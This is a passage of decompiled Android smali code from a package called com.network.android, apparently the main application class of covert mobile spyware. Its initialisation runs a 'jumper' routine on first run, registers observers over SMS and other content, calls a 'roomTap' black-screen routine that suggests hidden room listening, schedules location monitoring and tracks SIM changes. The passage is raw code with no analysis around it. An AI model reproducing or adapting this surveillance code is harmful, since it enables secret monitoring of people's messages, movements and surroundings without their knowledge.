    sput-object v1, Lcom/network/android/agent/NetworkApp;->e:Landroid/content/Context;

    const-string v0, "NetworkPreferences"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v2}, Lcom/network/android/agent/NetworkApp;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    sget-object v2, Lcom/network/android/agent/NetworkApp;->b:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantLock;->lock()V

    const-string v2, "isItFirstRunEver"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "NetworkApp initialize is it first run in conf : "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-eqz v2, :cond_0

    new-instance v0, Ljava/io/File;

    const-string v2, "/data/data/com.network.android"

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/h/b;->a(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->mkdir()Z

    const-string v0, "NetworkPreferences"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v2}, Lcom/network/android/agent/NetworkApp;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v2, "NetworkApp initialize setting first run param to false"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "isItFirstRunEver"

    const/4 v4, 0x0

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    invoke-static {v1}, Lcom/network/h/a;->a(Landroid/content/Context;)I

    move-result v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "NetworkApp jumper result: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    sget-object v2, Lcom/network/android/agent/NetworkApp;->b:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantLock;->unlock()V

    invoke-static {v1}, Lcom/network/h/b;->h(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_1

    :goto_0
    return-void

    :cond_1
    sget-object v2, Lcom/network/android/agent/NetworkApp;->a:Landroid/os/Handler;

    new-instance v3, Lcom/network/android/agent/a;

    invoke-direct {v3, p0, v1}, Lcom/network/android/agent/a;-><init>(Lcom/network/android/agent/NetworkApp;Landroid/content/Context;)V

    const-wide/32 v4, 0x493e0

    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    sget-object v2, Lcom/network/android/agent/NetworkApp;->a:Landroid/os/Handler;

    invoke-static {v2}, Lcom/network/android/ab;->a(Landroid/os/Handler;)V

    sget-object v2, Lcom/network/android/agent/NetworkApp;->a:Landroid/os/Handler;

    new-instance v3, Lcom/network/android/agent/b;

    invoke-direct {v3, p0}, Lcom/network/android/agent/b;-><init>(Lcom/network/android/agent/NetworkApp;)V

    invoke-virtual {v2, v3}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    const-string v2, "finish"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    new-instance v3, Lcom/network/android/monitor/observer/n;

    invoke-direct {v3}, Lcom/network/android/monitor/observer/n;-><init>()V

    invoke-virtual {p0, v3, p1}, Lcom/network/android/agent/NetworkApp;->a(Lcom/network/android/monitor/observer/r;Landroid/content/IntentFilter;)V

    new-instance v3, Lcom/network/android/monitor/observer/a;

    invoke-direct {v3}, Lcom/network/android/monitor/observer/a;-><init>()V

    invoke-virtual {p0, v3, p1}, Lcom/network/android/agent/NetworkApp;->a(Lcom/network/android/monitor/observer/r;Landroid/content/IntentFilter;)V

    new-instance v3, Lcom/network/android/monitor/observer/g;

    invoke-direct {v3, v2}, Lcom/network/android/monitor/observer/g;-><init>(Z)V

    invoke-virtual {p0, v3, p1}, Lcom/network/android/agent/NetworkApp;->a(Lcom/network/android/monitor/observer/r;Landroid/content/IntentFilter;)V

    new-instance v2, Lcom/network/android/monitor/observer/e;

    invoke-direct {v2}, Lcom/network/android/monitor/observer/e;-><init>()V

    invoke-virtual {p0, v2, p1}, Lcom/network/android/agent/NetworkApp;->a(Lcom/network/android/monitor/observer/r;Landroid/content/IntentFilter;)V

    new-instance v2, Lcom/network/android/monitor/observer/l;

    invoke-direct {v2}, Lcom/network/android/monitor/observer/l;-><init>()V

    invoke-virtual {p0, v2, p1}, Lcom/network/android/agent/NetworkApp;->a(Lcom/network/android/monitor/observer/r;Landroid/content/IntentFilter;)V

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v2, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v3, 0x0

    invoke-static {v2, v1, v3}, Lcom/network/android/m;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v2, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v3, 0x0

    invoke-static {v2, v1, v3}, Lcom/network/android/d/a;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v2, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v3, 0x0

    invoke-static {v2, v1, v3}, Lcom/network/android/d/g;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v2, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v3, 0x0

    invoke-static {v2, v1, v3}, Lcom/network/android/d/c;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v2, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v3, 0x0

    invoke-static {v2, v1, v3}, Lcom/network/android/d/i;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v2, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v3, 0x0

    invoke-static {v2, v1, v3}, Lcom/network/android/d/e;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    invoke-static {p0, v0}, Lcom/network/android/roomTap/BlackScreen;->a(Landroid/content/Context;Landroid/content/SharedPreferences;)V

    invoke-static {v1}, Lcom/network/location/a;->c(Landroid/content/Context;)V

    invoke-static {}, Lcom/network/i/b;->a()Lcom/network/i/b;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    const-string v0, "NetworkApp initialize end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto/16 :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "initialize: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1
.end method

.method public final b()V
    .locals 10

    const-wide/16 v8, 0x0

    :try_start_0
    invoke-static {}, Lcom/network/b/b;->v()J

    move-result-wide v0

    invoke-static {}, Lcom/network/b/b;->w()J

    move-result-wide v2

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "NetworkApp locationMonitorTimeLimit: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "NetworkApp locationMonitorSampleRateLong: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    cmp-long v4, v2, v8

    if-nez v4, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    cmp-long v4, v0, v8

    if-nez v4, :cond_2

    invoke-static {p0, v2, v3, v0, v1}, Lcom/network/android/a/c;->a(Landroid/content/Context;JJ)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "NetworkApp locationMonitor: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_2
    :try_start_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    const-wide/16 v6, 0x3e8

    div-long/2addr v4, v6

    sub-long/2addr v0, v4

    cmp-long v4, v0, v8

    if-lez v4, :cond_0

    invoke-static {p0, v2, v3, v0, v1}, Lcom/network/android/a/c;->a(Landroid/content/Context;JJ)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0
.end method

.method public final c(Landroid/content/Context;)V
    .locals 7

    const/4 v1, 0x1

    const/4 v2, 0x0

    :try_start_0
    const-string v0, "NetworkPreferences"

    const/4 v3, 0x0

    invoke-virtual {p1, v0, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    const-string v0, "phone"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v5

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "BootReceiver curent Sim: "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-eqz v5, :cond_0

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_2

    :cond_0
    sget-object v0, Lcom/network/b/b;->C:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "No Sim !!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    const/4 v1, 0x7

    const-string v2, "LOG_SIM_NOT_FOUND"

    invoke-static {v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    :goto_0
    return-void

    :cond_1
    const-string v0, "No Sim, but we are local Installation mode"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "checkSimChange: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_2
    :try_start_1
    const-string v0, "NetworkWindowSim"

    const-string v3, "No Sim Number"

    invoke-interface {v4, v0, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "BootReceiver last Sim: "

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-nez v0, :cond_7

    const-string v0, "BootReceiver failed to retrive last sim. use: No Sim Number"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "No Sim Number"

    move-object v3, v0

    :goto_1
    sget-object v0, Lcom/network/b/b;->C:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    move v0, v1

    :goto_2
    if-eqz v0, :cond_3

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BootReceiver Sim Changed Old: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BootReceiver Sim Changed new: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/agent/NetworkApp;->a:Landroid/os/Handler;

    new-instance v1, Lcom/network/android/agent/f;

    invoke-direct {v1, p0, p1}, Lcom/network/android/agent/f;-><init>(Lcom/network/android/agent/NetworkApp;Landroid/content/Context;)V

    const-wide/16 v2, 0x7d0

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_3
    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "NetworkWindowSim"

    invoke-interface {v0, v1, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    goto/16 :goto_0

    :cond_4
    move v0, v2

    goto :goto_2

    :cond_5
    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "No Sim Number"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    move-result v0

    if-nez v0, :cond_6

    :goto_3
    move v0, v1

    goto :goto_2

    :cond_6
    move v1, v2

    goto :goto_3

    :cond_7
    move-object v3, v0

    goto :goto_1
.end method

.method public onCreate()V
    .locals 4

    :try_start_0
    const-string v0, "NetworApp onCreate"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-super {p0}, Lcom/network/android/android/monitor/AndroidMonitorApplication;->onCreate()V

    const-string v0, "NetworApp onCreate readProperties"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/b/a;->c()V

    const-string v0, "NetworApp onCreate deleteUpgradeFiles"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/h/j;->b()V

    sget-object v0, Lcom/network/android/agent/NetworkApp;->a:Landroid/os/Handler;

    new-instance v1, Lcom/network/android/agent/c;

    invoke-direct {v1, p0}, Lcom/network/android/agent/c;-><init>(Lcom/network/android/agent/NetworkApp;)V

    const-wide/16 v2, 0xfa0

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    sget-object v0, Lcom/network/android/agent/NetworkApp;->a:Landroid/os/Handler;

    new-instance v1, Lcom/network/android/agent/d;

    invoke-direct {v1, p0}, Lcom/network/android/agent/d;-><init>(Lcom/network/android/agent/NetworkApp;)V

    const-wide/16 v2, 0x2710

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "onCreate: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method
